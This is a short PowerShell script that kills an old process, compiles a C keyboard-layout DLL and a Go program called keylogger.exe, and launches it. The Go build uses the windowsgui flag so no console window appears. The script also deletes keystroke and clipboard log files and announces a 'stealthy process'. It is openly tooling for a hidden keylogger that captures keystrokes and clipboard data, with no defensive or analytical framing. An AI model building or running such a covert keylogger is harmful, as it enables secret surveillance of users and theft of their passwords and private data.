Write-Output "# Killing old processes"
Stop-Process -Name "keylogger" -Force
Write-Output "# Compiling C"
x86_64-w64-mingw32-gcc -c -o keyboard_layout.o keyboard_layout.c
x86_64-w64-mingw32-gcc -shared -o libkeyboard_layout.dll keyboard_layout.o
Write-Output "# Compiling Go"
go build -ldflags "-H=windowsgui" -o keylogger.exe main.go 
Write-Output "# Cleaning up"
del keystrokes.txt
del clipboard.txt 
Write-Output "# Done"

Write-Output "# Running stealthy process..."
.\keylogger.exe
Write-Output 'To stop the process, write Stop-Process -Name "keylogger" -Force"'